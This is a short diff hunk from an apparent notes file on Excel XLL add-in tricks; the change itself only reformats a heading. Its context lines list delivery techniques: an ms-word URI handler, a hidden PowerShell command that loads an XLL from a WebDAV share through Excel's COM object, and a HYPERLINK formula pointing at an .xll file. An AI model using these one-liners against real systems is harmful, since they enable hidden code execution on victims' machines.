@@ -9,7 +9,7 @@ Google Groups: https://groups.google.com/forum/#!msg/exceldna/d2ogsPkv6YM/NGnSrU
 Many others
 
 <br><br>
-#interesting
+#<strong>interesting</strong> <br>
 ms-word:nft|u|http://PATH  <br>
 powershell -w hidden -c "IEX ((new-object -ComObject excel.application).RegisterXLL('\\webdavxll_poc.xll')"  <br>
 =HYPERLINK("http://127.0.0.1/xll.xll", "CLICK"  <br>
